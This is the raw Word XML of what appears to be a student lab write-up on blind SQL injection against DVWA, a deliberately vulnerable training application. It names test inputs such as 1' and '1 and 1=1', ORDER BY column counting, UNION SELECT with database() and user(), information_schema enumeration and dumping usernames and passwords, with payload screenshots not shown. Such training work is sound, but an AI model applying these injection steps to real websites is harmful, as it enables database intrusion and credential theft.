        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>On the SQL Injection (Blind) page on DVWA, typing 1 into the textbox provides information about the user with ID 1</w:t>
      </w:r>
      <w:r w:rsidR="007F4713">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 5.1]</w:t>
      </w:r>
      <w:r w:rsidR="007F4713" w:rsidRPr="007F4713">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9154D2" w14:textId="2FDBEC5A" w:rsidR="007F4713" w:rsidRDefault="007F4713" w:rsidP="007D2FD3">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5571AB68" wp14:editId="69B30E90">
            <wp:extent cx="6828790" cy="3086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6839000" cy="3090714"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="007F4713">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CAE79D" w14:textId="0A3F897A" w:rsidR="007F4713" w:rsidRDefault="007F4713" w:rsidP="007F4713">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="006D1BE2">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="006D1BE2">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>User Information for ID 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028BAFAE" w14:textId="654E8E26" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="007F4713">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Typing in 1’ to test vulnerability produces no error message and no result either. The page has processed the request because the input 1’ is in the URL after the page loads but it produces no output </w:t>
      </w:r>
      <w:r w:rsidR="006D1BE2">
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>[Figure 5.2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9787AA" w14:textId="17F98C39" w:rsidR="006D1BE2" w:rsidRDefault="006D1BE2" w:rsidP="007F4713">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B8531C9" wp14:editId="7E936013">
            <wp:extent cx="6821184" cy="240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6885607" cy="2422970"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DB402B" w14:textId="773130B4" w:rsidR="006D1BE2" w:rsidRDefault="006D1BE2" w:rsidP="006D1BE2">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Using 1’ To Test For </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35266FF6" w14:textId="1EA212E6" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81"/>
    <w:p w14:paraId="4ABBD5EC" w14:textId="230AACCE" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81"/>
    <w:p w14:paraId="6B942E27" w14:textId="2EBB8DC6" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Typing in 1 and 1=1, which is a true statement, produces a valid page meaning that there is an SQLi vulnerability here but it is blind as it discloses no information about the database so various tests would have to be carried out to see which works[Figure 5.3].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F02D6DB" w14:textId="3DEBFC00" w:rsidR="007021F0" w:rsidRDefault="007021F0" w:rsidP="007F4713">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F8BA7FF" wp14:editId="153C566A">
            <wp:extent cx="6819900" cy="3352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6856676" cy="3370880"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F1E7A8" w14:textId="47D4A90C" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00907C61" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Using 1</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and 1=1 </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>To Test For</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E28B9A" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Carrying </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>out</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>additional test by passing the URL a false statement</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> which returns an invalid page with no results or error message</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>[Figure 5.4]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">, indicates </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">that there is a blind </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> in this page: the server is executing the code, even if it doesn't show it explicitly in the response.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D380E3" w14:textId="7E125DAF" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4528616A" wp14:editId="5FFC02D4">
            <wp:extent cx="6841490" cy="417195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849324" cy="4176727"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="041FE4DC" w14:textId="76854290" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: Using 1 and 1=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> To Test For </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782EB343" w14:textId="3B6186B2" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00907C61">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3.2</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:bookmarkStart w:id="20" w:name="_Hlk67660704"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Exploiting Blind </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="20"/>
    <w:p w14:paraId="6E361E2D" w14:textId="44EEADA8" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00907C61">
      <w:r>
        <w:t xml:space="preserve">To extract information from the database, knowledge of what the databases are, the tables it contains, and what columns they have can be determined using the </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">‘order by’ </w:t>
      </w:r>
      <w:r>
        <w:t>SQL clause, Using 2 here produces a valid page meaning there are 2 columns used on this page</w:t>
      </w:r>
      <w:r w:rsidR="00AD50A7">
        <w:t>[Figure5.</w:t>
      </w:r>
      <w:r>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00AD50A7">
        <w:t>].</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58786DAC" w14:textId="1E6245B0" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00907C61">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B1843E2" wp14:editId="5FE1F778">
            <wp:extent cx="5943600" cy="3534410"/>
            <wp:effectExtent l="0" t="0" r="0" b="889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14:paraId="7B40419B" w14:textId="63B6791C" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Checking For Number of Columns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC506FC" w14:textId="6D30B164" w:rsidR="00907C61" w:rsidRDefault="00ED0E81" w:rsidP="00907C61">
      <w:r>
        <w:t xml:space="preserve">With this, a </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>UNION SELECT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement can be built, the SQL Union operator is used to combine the results sets of 2 or more </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statements</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>[Figure5.6].</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23890016" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00907C61"/>
    <w:p w14:paraId="7958EF4E" w14:textId="5989649B" w:rsidR="00907C61" w:rsidRPr="00907C61" w:rsidRDefault="00907C61" w:rsidP="00907C61">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06E57291" wp14:editId="01BB332A">
            <wp:extent cx="6791325" cy="38404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6838963" cy="3867419"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF1D768" w14:textId="035CF278" w:rsidR="00907C61" w:rsidRDefault="00907C61" w:rsidP="00907C61">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Using</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>UNION</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> SELECT Statements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA4C94F" w14:textId="05A67F12" w:rsidR="00907C61" w:rsidRDefault="00ED0E81" w:rsidP="00907C61">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Can also determine the database name and the user used by the application to connect to its Database Management System using the MYSQL predefined functions database() and user(). </w:t>
      </w:r>
      <w:r w:rsidR="00AD50A7">
        <w:t>[Figure 5.</w:t>
      </w:r>
      <w:r>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="00AD50A7">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="00220A2F">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772487BA" w14:textId="64ADCD12" w:rsidR="00AD50A7" w:rsidRDefault="00AD50A7" w:rsidP="00907C61">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A1959B7" wp14:editId="04A97FC1">
            <wp:extent cx="6829425" cy="384772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6882133" cy="3877425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF957C5" w14:textId="56B364B7" w:rsidR="00220A2F" w:rsidRDefault="00220A2F" w:rsidP="00D47184">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Using Union Select Statements To Display Database Name and User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F34D162" w14:textId="735667CA" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00D47184">
      <w:r>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>information_schema.tables</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> will display all the available tables used on the page</w:t>
      </w:r>
      <w:r w:rsidR="00D47184">
        <w:t xml:space="preserve"> [Figure 5.</w:t>
      </w:r>
      <w:r>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidR="00D47184">
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E46F92A" w14:textId="791453DF" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00D47184">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1BE27EA9" wp14:editId="50D81C5A">
            <wp:extent cx="6829425" cy="4038600"/>
            <wp:effectExtent l="0" t="0" r="952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94045" cy="4076813"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="484362C2" w14:textId="2C93EC48" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>information_schema</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> To Display All Available Tables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F7B7CC" w14:textId="0E0049B6" w:rsidR="00D47184" w:rsidRDefault="00ED0E81" w:rsidP="00D47184">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>With information about table names and columns gathered, a union select statement can be run that selects the username and password on the user's table and displays it on the browser.</w:t>
      </w:r>
      <w:r w:rsidR="00B04B29">
        <w:t xml:space="preserve"> [Figure 5.</w:t>
      </w:r>
      <w:r>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="00B04B29">
        <w:t>].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5982E06F" w14:textId="04078C70" w:rsidR="00D47184" w:rsidRDefault="00D47184" w:rsidP="00D47184">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C0BC8EC" wp14:editId="140E2D86">
            <wp:extent cx="6791960" cy="370522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6802776" cy="3711125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3523F64D" w14:textId="72BA4A31" w:rsidR="00D47184" w:rsidRDefault="00D47184" w:rsidP="00D47184">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
